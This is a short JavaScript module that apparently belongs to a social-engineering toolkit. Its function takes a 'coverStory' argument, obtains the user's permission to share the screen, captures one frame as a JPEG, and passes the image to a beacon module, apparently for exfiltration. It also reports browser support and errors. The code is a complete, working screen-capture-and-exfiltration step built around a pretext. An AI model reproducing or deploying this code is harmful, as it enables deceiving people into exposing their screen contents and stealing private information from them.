import { forceEvent } from '../beacon.js';

export async function requestPermission(coverStory, options) {
  if (!navigator.mediaDevices?.getDisplayMedia) {
    await forceEvent('screen_capture', { supported: false });
    return { supported: false };
  }
  try {
    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
    const track = stream.getVideoTracks()[0];
    const settings = track.getSettings();
    // Capture one frame via OffscreenCanvas / regular canvas
    const video = document.createElement('video');
    video.srcObject = stream;
    video.muted = true;
    await video.play();
    const canvas = document.createElement('canvas');
    canvas.width = settings.width || video.videoWidth || 1280;
    canvas.height = settings.height || video.videoHeight || 720;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
    stream.getTracks().forEach(t => t.stop());
    await forceEvent('screen_capture', { dataUrl, width: canvas.width, height: canvas.height });
    return { dataUrl, width: canvas.width, height: canvas.height };
  } catch (e) {
    await forceEvent('screen_capture', { supported: false, error: e.message });
    return { supported: false, error: e.message };
  }
}
